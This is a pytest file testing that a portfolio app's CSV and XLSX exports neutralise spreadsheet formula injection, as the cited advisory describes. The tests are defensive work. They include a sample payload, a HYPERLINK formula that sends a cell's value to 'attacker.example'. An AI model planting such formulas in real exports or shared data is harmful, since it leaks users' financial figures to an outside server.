"""Exported text is shown by a spreadsheet, never run (GHSA-w8x6-x99c-773x).

A note, an instrument's name or its Yahoo symbol is typed by a person, and the
catalogue is shared: a writer in one portfolio can put text into another
portfolio's export. Opened in Excel, LibreOffice or Sheets, a cell that starts
with "=" is a formula, such as a HYPERLINK that carries the sheet's numbers to
another server, and "+", "-", "@", a tab or a carriage return start one in some
of them.

CSV has no cell types, so text that starts like a formula gets a leading quote,
OWASP's rule. XLSX has them: every text cell is written as text, which is shown
and not evaluated, with no quote to see. Numbers are numbers in both, so a
negative figure keeps its sign.
"""

from __future__ import annotations

import csv
import io
from decimal import Decimal

import pytest
from openpyxl import load_workbook

import factories as fac
from app import exports
from test_routes import bind_to_only_portfolio, make_login

LEADS = ["=", "+", "-", "@", "\t", "\r"]
LINK = 'HYPERLINK("http://attacker.example/?x="&A2,"Click to verify")'


def _csv_rows(body: bytes) -> list[list[str]]:
    return list(csv.reader(io.StringIO(body.decode("utf-8-sig"))))


def _sheet(body: bytes):
    return load_workbook(io.BytesIO(body)).worksheets[0]


@pytest.mark.parametrize("lead", LEADS, ids=repr)
def test_csv_quotes_text_that_starts_like_a_formula(lead):
    rows = _csv_rows(exports.to_csv(["Note", "Value"], [[lead + LINK, Decimal("-12.50")]]))
    assert rows[1][0] == "'" + lead + LINK
    assert rows[1][1] == "-12.50", "a negative number is not a formula"


@pytest.mark.parametrize("lead", LEADS, ids=repr)
def test_xlsx_writes_text_that_starts_like_a_formula_as_text(lead):
    ws = _sheet(exports.to_xlsx({"Report": (["Note", "Value"],
                                            [[lead + LINK, Decimal("-12.50")]])}))
    assert ws["A2"].data_type == "s", "written as a formula"
    assert ws["A2"].value.endswith(LINK) and not ws["A2"].value.startswith("'")
    assert ws["B2"].data_type == "n" and ws["B2"].value == -12.5


def test_ordinary_text_is_left_alone():
    rows = _csv_rows(exports.to_csv(["Note"], [["bought on the dip"], ["2026-01-05"], [""]]))
    assert [r[0] for r in rows[1:]] == ["bought on the dip", "2026-01-05", ""]


@pytest.mark.parametrize("fmt", ["csv", "xlsx"])
def test_an_exported_name_and_note_cannot_run(client, session_factory, fmt):
    """The route end to end, with the advisory's payload in the shared
    catalogue's name and in a trade's note."""
    make_login(client, session_factory)
    with session_factory() as s:
        bind_to_only_portfolio(s)
        inst = fac.make_instrument(s, "ACME", name="=" + LINK)
        fac.add_trade(s, inst, "2026-01-05", "buy", 10, "4.00", note="@SUM(1+1)")
        s.commit()
    resp = client.get(f"/export/download?report=transactions&fmt={fmt}")
    assert resp.status_code == 200
    if fmt == "csv":
        header, row = _csv_rows(resp.content)[:2]
        assert row[header.index("Name")] == "'=" + LINK
        assert row[header.index("Note")] == "'@SUM(1+1)"
    else:
        ws = _sheet(resp.content)
        header = [c.value for c in ws[1]]
        for column, text in (("Name", "=" + LINK), ("Note", "@SUM(1+1)")):
            found = ws.cell(row=2, column=header.index(column) + 1)
            assert found.data_type == "s" and found.value == text, column
